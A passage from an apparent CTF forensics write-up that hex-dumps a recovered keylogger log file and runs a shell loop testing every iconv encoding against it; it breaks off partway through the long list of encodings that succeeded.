<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div></pre></td><td class="code"><pre><div class="line">[noraj@rawsec]––––––––––––––––––––––––––––––[~/CTF/WhiteHat_GrandPrix/2016/For2]</div><div class="line">$ file keylog.log_file.None.0x80eb7008.dat</div><div class="line">keylog.log_file.None.0x80eb7008.dat: Non-ISO extended-ASCII text, with NEL line terminators</div><div class="line"></div><div class="line">[noraj@rawsec]––––––––––––––––––––––––––––––[~/CTF/WhiteHat_GrandPrix/2016/For2]</div><div class="line">$ xxd keylog.log_file.None.0x80eb7008.dat</div><div class="line">00000000: 8589 9790 83bd b3ba 859b b0aa bbac 83b6  ................</div><div class="line">00000010: bbb2 b2b1 859b b0aa bbac 83a9 bbb2 b2b1  ................</div><div class="line">00000020: 859c 9f9d 958d 8e9f 9d9b 83bd b1b3 bbfe  ................</div><div class="line">00000030: a7b1 abfe b9ab a7ff 859c 9f9d 958d 8e9f  ................</div><div class="line">00000040: 9d9b 83fe e185 9bb0 aabb ac83 a9bb b2fe  ................</div><div class="line">00000050: b1ac fea9 bbb2 b2fe e185 9bb0 aabb ac83  ................</div><div class="line">00000060: a9b6 bfaa bbac a8bb acfe 869a 859b b0aa  ................</div><div class="line">00000070: bbac 8385 8997 9083 bdb6 acb1 b3bb 859b  ................</div><div class="line">00000080: b0aa bbac 83a9 bbb2 feb1 ac85 9c9f 9d95  ................</div><div class="line">00000090: 8d8e 9f9d 9b83 859c 9f9d 958d 8e9f 9d9b  ................</div><div class="line">000000a0: 8385 9c9f 9d95 8d8e 9f9d 9b83 b2bd b1b3  ................</div><div class="line">000000b0: bbfe b1ac fea9 bbb2 bdb1 b3bb 859b b0aa  ................</div><div class="line">000000c0: bbac 83ab b6b3 fef0 f0f0 fe85 9c9f 9d95  ................</div><div class="line">000000d0: 8d8e 9f9d 9b83 859c 9f9d 958d 8e9f 9d9b  ................</div><div class="line">000000e0: 8385 9c9f 9d95 8d8e 9f9d 9b83 859c 9f9d  ................</div><div class="line">000000f0: 958d 8e9f 9d9b 8385 9c9f 9d95 8d8e 9f9d  ................</div><div class="line">00000100: 9b83 859c 9f9d 958d 8e9f 9d9b 8385 9c9f  ................</div><div class="line">00000110: 9d95 8d8e 9f9d 9b83 859c 9f9d 958d 8e9f  ................</div><div class="line">00000120: 9d9b 8385 9c9f 9d95 8d8e 9f9d 9b83 859c  ................</div><div class="line">00000130: 9f9d 958d 8e9f 9d9b 8385 9c9f 9d95 8d8e  ................</div><div class="line">00000140: 9f9d 9b83 859c 9f9d 958d 8e9f 9d9b 8385  ................</div><div class="line">00000150: 9c9f 9d95 8d8e 9f9d 9b83 b7fe b9b1 aafe  ................</div><div class="line">00000160: b7aa fef0 feaa b6bf aafe a9bb b2bd b1b3  ................</div><div class="line">00000170: bbfe e49a 859d aaac b283 aab8 bf85 9bb0  ................</div><div class="line">00000180: aabb ac83 859d aaac b283 aab8 bdbb b1b1  ................</div><div class="line">00000190: b5f0 bdb1 b385 9bb0 aabb ac83 aab6 b7ad  ................</div><div class="line">000001a0: b7ad b3a7 b8b2 bfb9 d7a5 a385 92bb b8aa  ................</div><div class="line">000001b0: 9fac acb1 a983 b5ba b7bb b5b5 bab7 eced  ................</div><div class="line">000001c0: e7ed e9ba b8b6 ede7 b4ad b2ad bab5 e7ed  ................</div><div class="line">000001d0: 859b b0aa bbac 83aa b6bf b0b5 a7b1 abff  ................</div><div class="line">000001e0: 859b b0aa bbac 83e4 9abf bcbd babb b8b9  ................</div><div class="line">000001f0: b6b7 b5b2 b3b0 b1ae afac adaa e1e1 e1a7  ................</div></pre></td></tr></table></figure>
<ul>
<li>This is nor UTF-8, nor WINDOWS-1252/C1252.</li>
<li>Try to determine what kind of encoding this is (source: <a href="http://superuser.com/questions/669700/non-iso-extended-ascii-text/669729#answer-732589" target="_blank" rel="external">superuser.com</a>):</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">$ iconv --list | sed &apos;s/\/\/$//&apos; | sort &gt; encodings.list</div><div class="line">$ for a in `cat encodings.list`; do</div><div class="line">printf &quot;$a  &quot;</div><div class="line">iconv -f $a -t UTF-8 keylog.log_file.None.0x80eb7008.dat &gt; /dev/null 2&gt;&amp;1 \</div><div class="line">&amp;&amp; echo &quot;ok: $a&quot; || echo &quot;fail: $a&quot;</div><div class="line">done | tee result.txt</div></pre></td></tr></table></figure>
<ul>
<li>Let’s take a look at results:</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div><div class="line">144</div><div class="line">145</div><div class="line">146</div><div class="line">147</div><div class="line">148</div><div class="line">149</div><div class="line">150</div><div class="line">151</div><div class="line">152</div><div class="line">153</div><div class="line">154</div><div class="line">155</div><div class="line">156</div><div class="line">157</div><div class="line">158</div><div class="line">159</div><div class="line">160</div><div class="line">161</div><div class="line">162</div><div class="line">163</div><div class="line">164</div><div class="line">165</div><div class="line">166</div><div class="line">167</div><div class="line">168</div><div class="line">169</div><div class="line">170</div><div class="line">171</div><div class="line">172</div><div class="line">173</div><div class="line">174</div><div class="line">175</div><div class="line">176</div><div class="line">177</div><div class="line">178</div><div class="line">179</div><div class="line">180</div><div class="line">181</div><div class="line">182</div><div class="line">183</div><div class="line">184</div><div class="line">185</div><div class="line">186</div><div class="line">187</div><div class="line">188</div><div class="line">189</div><div class="line">190</div><div class="line">191</div><div class="line">192</div><div class="line">193</div><div class="line">194</div><div class="line">195</div><div class="line">196</div><div class="line">197</div><div class="line">198</div><div class="line">199</div><div class="line">200</div><div class="line">201</div><div class="line">202</div><div class="line">203</div><div class="line">204</div><div class="line">205</div><div class="line">206</div><div class="line">207</div><div class="line">208</div><div class="line">209</div><div class="line">210</div><div class="line">211</div><div class="line">212</div><div class="line">213</div><div class="line">214</div><div class="line">215</div><div class="line">216</div><div class="line">217</div><div class="line">218</div><div class="line">219</div><div class="line">220</div><div class="line">221</div><div class="line">222</div><div class="line">223</div><div class="line">224</div><div class="line">225</div><div class="line">226</div><div class="line">227</div><div class="line">228</div><div class="line">229</div><div class="line">230</div><div class="line">231</div><div class="line">232</div><div class="line">233</div><div class="line">234</div><div class="line">235</div><div class="line">236</div><div class="line">237</div><div class="line">238</div><div class="line">239</div><div class="line">240</div><div class="line">241</div><div class="line">242</div><div class="line">243</div><div class="line">244</div><div class="line">245</div><div class="line">246</div><div class="line">247</div><div class="line">248</div><div class="line">249</div><div class="line">250</div><div class="line">251</div><div class="line">252</div><div class="line">253</div><div class="line">254</div><div class="line">255</div><div class="line">256</div><div class="line">257</div><div class="line">258</div><div class="line">259</div><div class="line">260</div><div class="line">261</div><div class="line">262</div><div class="line">263</div><div class="line">264</div><div class="line">265</div><div class="line">266</div><div class="line">267</div><div class="line">268</div><div class="line">269</div><div class="line">270</div><div class="line">271</div><div class="line">272</div><div class="line">273</div><div class="line">274</div><div class="line">275</div><div class="line">276</div><div class="line">277</div><div class="line">278</div><div class="line">279</div><div class="line">280</div><div class="line">281</div><div class="line">282</div><div class="line">283</div><div class="line">284</div><div class="line">285</div><div class="line">286</div><div class="line">287</div><div class="line">288</div><div class="line">289</div><div class="line">290</div><div class="line">291</div><div class="line">292</div><div class="line">293</div><div class="line">294</div><div class="line">295</div><div class="line">296</div><div class="line">297</div><div class="line">298</div><div class="line">299</div><div class="line">300</div><div class="line">301</div><div class="line">302</div><div class="line">303</div><div class="line">304</div><div class="line">305</div><div class="line">306</div><div class="line">307</div><div class="line">308</div><div class="line">309</div><div class="line">310</div><div class="line">311</div><div class="line">312</div><div class="line">313</div><div class="line">314</div><div class="line">315</div><div class="line">316</div><div class="line">317</div><div class="line">318</div><div class="line">319</div><div class="line">320</div><div class="line">321</div><div class="line">322</div><div class="line">323</div><div class="line">324</div><div class="line">325</div><div class="line">326</div><div class="line">327</div><div class="line">328</div><div class="line">329</div><div class="line">330</div><div class="line">331</div><div class="line">332</div><div class="line">333</div><div class="line">334</div><div class="line">335</div><div class="line">336</div><div class="line">337</div><div class="line">338</div><div class="line">339</div><div class="line">340</div><div class="line">341</div><div class="line">342</div><div class="line">343</div><div class="line">344</div><div class="line">345</div><div class="line">346</div><div class="line">347</div><div class="line">348</div><div class="line">349</div><div class="line">350</div><div class="line">351</div><div class="line">352</div><div class="line">353</div><div class="line">354</div><div class="line">355</div><div class="line">356</div><div class="line">357</div><div class="line">358</div><div class="line">359</div><div class="line">360</div><div class="line">361</div><div class="line">362</div><div class="line">363</div><div class="line">364</div><div class="line">365</div><div class="line">366</div><div class="line">367</div><div class="line">368</div><div class="line">369</div><div class="line">370</div><div class="line">371</div><div class="line">372</div><div class="line">373</div><div class="line">374</div><div class="line">375</div><div class="line">376</div><div class="line">377</div><div class="line">378</div><div class="line">379</div><div class="line">380</div><div class="line">381</div><div class="line">382</div><div class="line">383</div><div class="line">384</div><div class="line">385</div><div class="line">386</div><div class="line">387</div><div class="line">388</div><div class="line">389</div><div class="line">390</div><div class="line">391</div><div class="line">392</div><div class="line">393</div><div class="line">394</div><div class="line">395</div><div class="line">396</div><div class="line">397</div><div class="line">398</div><div class="line">399</div><div class="line">400</div><div class="line">401</div><div class="line">402</div><div class="line">403</div><div class="line">404</div><div class="line">405</div><div class="line">406</div><div class="line">407</div><div class="line">408</div><div class="line">409</div><div class="line">410</div><div class="line">411</div><div class="line">412</div><div class="line">413</div><div class="line">414</div><div class="line">415</div><div class="line">416</div><div class="line">417</div><div class="line">418</div><div class="line">419</div><div class="line">420</div><div class="line">421</div><div class="line">422</div><div class="line">423</div><div class="line">424</div><div class="line">425</div><div class="line">426</div><div class="line">427</div><div class="line">428</div><div class="line">429</div><div class="line">430</div><div class="line">431</div><div class="line">432</div><div class="line">433</div><div class="line">434</div><div class="line">435</div><div class="line">436</div><div class="line">437</div><div class="line">438</div><div class="line">439</div><div class="line">440</div><div class="line">441</div><div class="line">442</div><div class="line">443</div><div class="line">444</div><div class="line">445</div><div class="line">446</div><div class="line">447</div><div class="line">448</div><div class="line">449</div><div class="line">450</div><div class="line">451</div><div class="line">452</div><div class="line">453</div><div class="line">454</div><div class="line">455</div><div class="line">456</div><div class="line">457</div><div class="line">458</div><div class="line">459</div><div class="line">460</div><div class="line">461</div><div class="line">462</div><div class="line">463</div><div class="line">464</div><div class="line">465</div><div class="line">466</div><div class="line">467</div><div class="line">468</div><div class="line">469</div><div class="line">470</div><div class="line">471</div><div class="line">472</div><div class="line">473</div><div class="line">474</div><div class="line">475</div><div class="line">476</div><div class="line">477</div><div class="line">478</div><div class="line">479</div><div class="line">480</div><div class="line">481</div><div class="line">482</div><div class="line">483</div><div class="line">484</div><div class="line">485</div><div class="line">486</div><div class="line">487</div><div class="line">488</div><div class="line">489</div><div class="line">490</div><div class="line">491</div><div class="line">492</div><div class="line">493</div><div class="line">494</div></pre></td><td class="code"><pre><div class="line">1026  ok: 1026</div><div class="line">1047  ok: 1047</div><div class="line">437  ok: 437</div><div class="line">500  ok: 500</div><div class="line">500V1  ok: 500V1</div><div class="line">850  ok: 850</div><div class="line">851  ok: 851</div><div class="line">852  ok: 852</div><div class="line">855  ok: 855</div><div class="line">860  ok: 860</div><div class="line">861  ok: 861</div><div class="line">862  ok: 862</div><div class="line">863  ok: 863</div><div class="line">865  ok: 865</div><div class="line">866  ok: 866</div><div class="line">866NAV  ok: 866NAV</div><div class="line">8859_1  ok: 8859_1</div><div class="line">8859_2  ok: 8859_2</div><div class="line">8859_4  ok: 8859_4</div><div class="line">8859_5  ok: 8859_5</div><div class="line">8859_9  ok: 8859_9</div><div class="line">BALTIC  ok: BALTIC</div><div class="line">CP037  ok: CP037</div><div class="line">CP10007  ok: CP10007</div><div class="line">CP1025  ok: CP1025</div><div class="line">CP1026  ok: CP1026</div><div class="line">CP1047  ok: CP1047</div><div class="line">CP1070  ok: CP1070</div><div class="line">CP1079  ok: CP1079</div><div class="line">CP1081  ok: CP1081</div><div class="line">CP1084  ok: CP1084</div><div class="line">CP1097  ok: CP1097</div><div class="line">CP1112  ok: CP1112</div><div class="line">CP1122  ok: CP1122</div><div class="line">CP1123  ok: CP1123</div><div class="line">CP1124  ok: CP1124</div><div class="line">CP1125  ok: CP1125</div><div class="line">CP1129  ok: CP1129</div><div class="line">CP1130  ok: CP1130</div><div class="line">CP1137  ok: CP1137</div><div class="line">CP1140  ok: CP1140</div><div class="line">CP1141  ok: CP1141</div><div class="line">CP1142  ok: CP1142</div><div class="line">CP1143  ok: CP1143</div><div class="line">CP1144  ok: CP1144</div><div class="line">CP1145  ok: CP1145</div><div class="line">CP1146  ok: CP1146</div><div class="line">CP1147  ok: CP1147</div><div class="line">CP1148  ok: CP1148</div><div class="line">CP1149  ok: CP1149</div><div class="line">CP1153  ok: CP1153</div><div class="line">CP1154  ok: CP1154</div><div class="line">CP1155  ok: CP1155</div><div class="line">CP1156  ok: CP1156</div><div class="line">CP1157  ok: CP1157</div><div class="line">CP1158  ok: CP1158</div><div class="line">CP1160  ok: CP1160</div><div class="line">CP1163  ok: CP1163</div><div class="line">CP1164  ok: CP1164</div><div class="line">CP1166  ok: CP1166</div><div class="line">CP1167  ok: CP1167</div><div class="line">CP1251  ok: CP1251</div><div class="line">CP1256  ok: CP1256</div><div class="line">CP1282  ok: CP1282</div><div class="line">CP1390  ok: CP1390</div><div class="line">CP1399  ok: CP1399</div><div class="line">CP273  ok: CP273</div><div class="line">CP278  ok: CP278</div><div class="line">CP280  ok: CP280</div><div class="line">CP282  ok: CP282</div><div class="line">CP284  ok: CP284</div><div class="line">CP285  ok: CP285</div><div class="line">CP297  ok: CP297</div><div class="line">CP437  ok: CP437</div><div class="line">CP500  ok: CP500</div><div class="line">CP5347  ok: CP5347</div><div class="line">CP737  ok: CP737</div><div class="line">CP770  ok: CP770</div><div class="line">CP771  ok: CP771</div><div class="line">CP772  ok: CP772</div><div class="line">CP773  ok: CP773</div><div class="line">CP774  ok: CP774</div><div class="line">CP775  ok: CP775</div><div class="line">CP819  ok: CP819</div><div class="line">CP850  ok: CP850</div><div class="line">CP851  ok: CP851</div><div class="line">CP852  ok: CP852</div><div class="line">CP855  ok: CP855</div><div class="line">CP860  ok: CP860</div><div class="line">CP861  ok: CP861</div><div class="line">CP862  ok: CP862</div><div class="line">CP863  ok: CP863</div><div class="line">CP865  ok: CP865</div><div class="line">CP866  ok: CP866</div><div class="line">CP866NAV  ok: CP866NAV</div><div class="line">CP870  ok: CP870</div><div class="line">CP871  ok: CP871</div><div class="line">CP880  ok: CP880</div><div class="line">CP901  ok: CP901</div><div class="line">CP902  ok: CP902</div><div class="line">CP9030  ok: CP9030</div><div class="line">CP912  ok: CP912</div><div class="line">CP915  ok: CP915</div><div class="line">CP920  ok: CP920</div><div class="line">CP921  ok: CP921</div><div class="line">CP922  ok: CP922</div><div class="line">CP9448  ok: CP9448</div><div class="line">CP-HU  ok: CP-HU</div><div class="line">CPIBM861  ok: CPIBM861</div><div class="line">CSIBM037  ok: CSIBM037</div><div class="line">CSIBM1025  ok: CSIBM1025</div><div class="line">CSIBM1026  ok: CSIBM1026</div><div class="line">CSIBM1097  ok: CSIBM1097</div><div class="line">CSIBM1112  ok: CSIBM1112</div><div class="line">CSIBM1122  ok: CSIBM1122</div><div class="line">CSIBM1123  ok: CSIBM1123</div><div class="line">CSIBM1124  ok: CSIBM1124</div><div class="line">CSIBM1129  ok: CSIBM1129</div><div class="line">CSIBM1130  ok: CSIBM1130</div><div class="line">CSIBM1137  ok: CSIBM1137</div><div class="line">CSIBM1140  ok: CSIBM1140</div><div class="line">CSIBM1141  ok: CSIBM1141</div><div class="line">CSIBM1142  ok: CSIBM1142</div><div class="line">CSIBM1143  ok: CSIBM1143</div><div class="line">CSIBM1144  ok: CSIBM1144</div><div class="line">CSIBM1145  ok: CSIBM1145</div><div class="line">CSIBM1146  ok: CSIBM1146</div><div class="line">CSIBM1147  ok: CSIBM1147</div><div class="line">CSIBM1148  ok: CSIBM1148</div><div class="line">CSIBM1149  ok: CSIBM1149</div><div class="line">CSIBM1153  ok: CSIBM1153</div><div class="line">CSIBM1154  ok: CSIBM1154</div><div class="line">CSIBM1155  ok: CSIBM1155</div><div class="line">CSIBM1156  ok: CSIBM1156</div><div class="line">CSIBM1157  ok: CSIBM1157</div><div class="line">CSIBM1158  ok: CSIBM1158</div><div class="line">CSIBM1160  ok: CSIBM1160</div><div class="line">CSIBM1163  ok: CSIBM1163</div><div class="line">CSIBM1164  ok: CSIBM1164</div><div class="line">CSIBM1166  ok: CSIBM1166</div><div class="line">CSIBM1167  ok: CSIBM1167</div><div class="line">CSIBM1390  ok: CSIBM1390</div><div class="line">CSIBM1399  ok: CSIBM1399</div><div class="line">CSIBM273  ok: CSIBM273</div><div class="line">CSIBM277  ok: CSIBM277</div><div class="line">CSIBM278  ok: CSIBM278</div><div class="line">CSIBM280  ok: CSIBM280</div><div class="line">CSIBM284  ok: CSIBM284</div><div class="line">CSIBM285  ok: CSIBM285</div><div class="line">CSIBM297  ok: CSIBM297</div><div class="line">CSIBM500  ok: CSIBM500</div><div class="line">CSIBM5347  ok: CSIBM5347</div><div class="line">CSIBM851  ok: CSIBM851</div><div class="line">CSIBM855  ok: CSIBM855</div><div class="line">CSIBM860  ok: CSIBM860</div><div class="line">CSIBM863  ok: CSIBM863</div><div class="line">CSIBM865  ok: CSIBM865</div><div class="line">CSIBM866  ok: CSIBM866</div><div class="line">CSIBM870  ok: CSIBM870</div><div class="line">CSIBM871  ok: CSIBM871</div><div class="line">CSIBM880  ok: CSIBM880</div><div class="line">CSIBM901  ok: CSIBM901</div><div class="line">CSIBM902  ok: CSIBM902</div><div class="line">CSIBM9030  ok: CSIBM9030</div><div class="line">CSIBM921  ok: CSIBM921</div><div class="line">CSIBM922  ok: CSIBM922</div><div class="line">CSIBM9448  ok: CSIBM9448</div><div class="line">CSISO111ECMACYRILLIC  ok: CSISO111ECMACYRILLIC</div><div class="line">CSISO139CSN369103  ok: CSISO139CSN369103</div><div class="line">CSISO143IECP271  ok: CSISO143IECP271</div><div class="line">CSISOLATIN1  ok: CSISOLATIN1</div><div class="line">CSISOLATIN2  ok: CSISOLATIN2</div><div class="line">CSISOLATIN4  ok: CSISOLATIN4</div><div class="line">CSISOLATIN5  ok: CSISOLATIN5</div><div class="line">CSISOLATIN6  ok: CSISOLATIN6</div><div class="line">CSISOLATINCYRILLIC  ok: CSISOLATINCYRILLIC</div><div class="line">CSKOI8R  ok: CSKOI8R</div><div class="line">CSMACINTOSH  ok: CSMACINTOSH</div><div class="line">CSN_369103  ok: CSN_369103</div><div class="line">CSPC775BALTIC  ok: CSPC775BALTIC</div><div class="line">CSPC850MULTILINGUAL  ok: CSPC850MULTILINGUAL</div><div class="line">CSPC862LATINHEBREW  ok: CSPC862LATINHEBREW</div><div class="line">CSPC8CODEPAGE437  ok: CSPC8CODEPAGE437</div><div class="line">CSPCP852  ok: CSPCP852</div><div class="line">CSUNICODE  ok: CSUNICODE</div><div class="line">CWI  ok: CWI</div><div class="line">CWI-2  ok: CWI-2</div><div class="line">CYRILLIC  ok: CYRILLIC</div><div class="line">EBCDIC-CP-BE  ok: EBCDIC-CP-BE</div><div class="line">EBCDIC-CP-CA  ok: EBCDIC-CP-CA</div><div class="line">EBCDIC-CP-CH  ok: EBCDIC-CP-CH</div><div class="line">EBCDIC-CP-DK  ok: EBCDIC-CP-DK</div><div class="line">EBCDIC-CP-ES  ok: EBCDIC-CP-ES</div><div class="line">EBCDIC-CP-FI  ok: EBCDIC-CP-FI</div><div class="line">EBCDIC-CP-FR  ok: EBCDIC-CP-FR</div><div class="line">EBCDIC-CP-GB  ok: EBCDIC-CP-GB</div><div class="line">EBCDIC-CP-IS  ok: EBCDIC-CP-IS</div><div class="line">EBCDIC-CP-IT  ok: EBCDIC-CP-IT</div><div class="line">EBCDIC-CP-NL  ok: EBCDIC-CP-NL</div><div class="line">EBCDIC-CP-NO  ok: EBCDIC-CP-NO</div><div class="line">EBCDIC-CP-ROECE  ok: EBCDIC-CP-ROECE</div><div class="line">EBCDIC-CP-SE  ok: EBCDIC-CP-SE</div><div class="line">EBCDIC-CP-US  ok: EBCDIC-CP-US</div><div class="line">EBCDIC-CP-WT  ok: EBCDIC-CP-WT</div><div class="line">EBCDIC-CP-YU  ok: EBCDIC-CP-YU</div><div class="line">EBCDIC-CYRILLIC  ok: EBCDIC-CYRILLIC</div><div class="line">EBCDIC-INT1  ok: EBCDIC-INT1</div><div class="line">ECMA-128  ok: ECMA-128</div><div class="line">ECMACYRILLIC  ok: ECMACYRILLIC</div><div class="line">ECMA-CYRILLIC  ok: ECMA-CYRILLIC</div><div class="line">GEORGIAN-ACADEMY  ok: GEORGIAN-ACADEMY</div><div class="line">GEORGIAN-PS  ok: GEORGIAN-PS</div><div class="line">IBM037  ok: IBM037</div><div class="line">IBM1025  ok: IBM1025</div><div class="line">IBM-1025  ok: IBM-1025</div><div class="line">IBM1026  ok: IBM1026</div><div class="line">IBM1047  ok: IBM1047</div><div class="line">IBM-1047  ok: IBM-1047</div><div class="line">IBM1097  ok: IBM1097</div><div class="line">IBM-1097  ok: IBM-1097</div><div class="line">IBM1112  ok: IBM1112</div><div class="line">IBM-1112  ok: IBM-1112</div><div class="line">IBM1122  ok: IBM1122</div><div class="line">IBM-1122  ok: IBM-1122</div><div class="line">IBM1123  ok: IBM1123</div><div class="line">IBM-1123  ok: IBM-1123</div><div class="line">IBM1124  ok: IBM1124</div><div class="line">IBM-1124  ok: IBM-1124</div><div class="line">IBM1129  ok: IBM1129</div><div class="line">IBM-1129  ok: IBM-1129</div><div class="line">IBM1130  ok: IBM1130</div><div class="line">IBM-1130  ok: IBM-1130</div><div class="line">IBM1137  ok: IBM1137</div><div class="line">IBM-1137  ok: IBM-1137</div><div class="line">IBM1140  ok: IBM1140</div><div class="line">IBM-1140  ok: IBM-1140</div><div class="line">IBM1141  ok: IBM1141</div><div class="line">IBM-1141  ok: IBM-1141</div><div class="line">IBM1142  ok: IBM1142</div><div class="line">IBM-1142  ok: IBM-1142</div><div class="line">IBM1143  ok: IBM1143</div><div class="line">IBM-1143  ok: IBM-1143</div><div class="line">IBM1144  ok: IBM1144</div><div class="line">IBM-1144  ok: IBM-1144</div><div class="line">IBM1145  ok: IBM1145</div><div class="line">IBM-1145  ok: IBM-1145</div><div class="line">IBM1146  ok: IBM1146</div><div class="line">IBM-1146  ok: IBM-1146</div><div class="line">IBM1147  ok: IBM1147</div><div class="line">IBM-1147  ok: IBM-1147</div><div class="line">IBM1148  ok: IBM1148</div><div class="line">IBM-1148  ok: IBM-1148</div><div class="line">IBM1149  ok: IBM1149</div><div class="line">IBM-1149  ok: IBM-1149</div><div class="line">IBM1153  ok: IBM1153</div><div class="line">IBM-1153  ok: IBM-1153</div><div class="line">IBM1154  ok: IBM1154</div><div class="line">IBM-1154  ok: IBM-1154</div><div class="line">IBM1155  ok: IBM1155</div><div class="line">IBM-1155  ok: IBM-1155</div><div class="line">IBM1156  ok: IBM1156</div><div class="line">IBM-1156  ok: IBM-1156</div><div class="line">IBM1157  ok: IBM1157</div><div class="line">IBM-1157  ok: IBM-1157</div><div class="line">IBM1158  ok: IBM1158</div><div class="line">IBM-1158  ok: IBM-1158</div><div class="line">IBM1160  ok: IBM1160</div><div class="line">IBM-1160  ok: IBM-1160</div><div class="line">IBM1163  ok: IBM1163</div><div class="line">IBM-1163  ok: IBM-1163</div><div class="line">IBM1164  ok: IBM1164</div><div class="line">IBM-1164  ok: IBM-1164</div><div class="line">IBM1166  ok: IBM1166</div><div class="line">IBM-1166  ok: IBM-1166</div><div class="line">IBM1167  ok: IBM1167</div><div class="line">IBM-1167  ok: IBM-1167</div><div class="line">IBM1390  ok: IBM1390</div><div class="line">IBM-1390  ok: IBM-1390</div><div class="line">IBM1399  ok: IBM1399</div><div class="line">IBM-1399  ok: IBM-1399</div><div class="line">IBM256  ok: IBM256</div><div class="line">IBM273  ok: IBM273</div><div class="line">IBM277  ok: IBM277</div><div class="line">IBM278  ok: IBM278</div><div class="line">IBM280  ok: IBM280</div><div class="line">IBM284  ok: IBM284</div><div class="line">IBM285  ok: IBM285</div><div class="line">IBM297  ok: IBM297</div><div class="line">IBM437  ok: IBM437</div><div class="line">IBM500  ok: IBM500</div><div class="line">IBM5347  ok: IBM5347</div><div class="line">IBM-5347  ok: IBM-5347</div><div class="line">IBM775  ok: IBM775</div><div class="line">IBM819  ok: IBM819</div><div class="line">IBM848  ok: IBM848</div><div class="line">IBM850  ok: IBM850</div><div class="line">IBM851  ok: IBM851</div><div class="line">IBM852  ok: IBM852</div><div class="line">IBM855  ok: IBM855</div><div class="line">IBM860  ok: IBM860</div><div class="line">IBM861  ok: IBM861</div><div class="line">IBM862  ok: IBM862</div><div class="line">IBM863  ok: IBM863</div><div class="line">IBM865  ok: IBM865</div><div class="line">IBM866  ok: IBM866</div><div class="line">IBM866NAV  ok: IBM866NAV</div><div class="line">IBM870  ok: IBM870</div><div class="line">IBM871  ok: IBM871</div><div class="line">IBM880  ok: IBM880</div><div class="line">IBM901  ok: IBM901</div><div class="line">IBM-901  ok: IBM-901</div><div class="line">IBM902  ok: IBM902</div><div class="line">IBM-902  ok: IBM-902</div><div class="line">IBM9030  ok: IBM9030</div><div class="line">IBM-9030  ok: IBM-9030</div><div class="line">IBM912  ok: IBM912</div><div class="line">IBM915  ok: IBM915</div><div class="line">IBM920  ok: IBM920</div><div class="line">IBM921  ok: IBM921</div><div class="line">IBM-921  ok: IBM-921</div><div class="line">IBM922  ok: IBM922</div><div class="line">IBM-922  ok: IBM-922</div><div class="line">IBM9448  ok: IBM9448</div><div class="line">IBM-9448  ok: IBM-9448</div><div class="line">IEC_P271  ok: IEC_P271</div><div class="line">IEC_P27-1  ok: IEC_P27-1</div><div class="line">ISO-10646/UCS2/  ok: ISO-10646/UCS2/</div><div class="line">ISO_11548-1  ok: ISO_11548-1</div><div class="line">ISO11548-1  ok: ISO11548-1</div><div class="line">ISO6937  ok: ISO6937</div><div class="line">ISO_6937  ok: ISO_6937</div><div class="line">ISO_6937:1992  ok: ISO_6937:1992</div><div class="line">ISO88591  ok: ISO88591</div><div class="line">ISO_8859-1  ok: ISO_8859-1</div><div class="line">ISO-8859-1  ok: ISO-8859-1</div><div class="line">ISO8859-1  ok: ISO8859-1</div><div class="line">ISO885910  ok: ISO885910</div><div class="line">ISO_8859-10  ok: ISO_8859-10</div><div 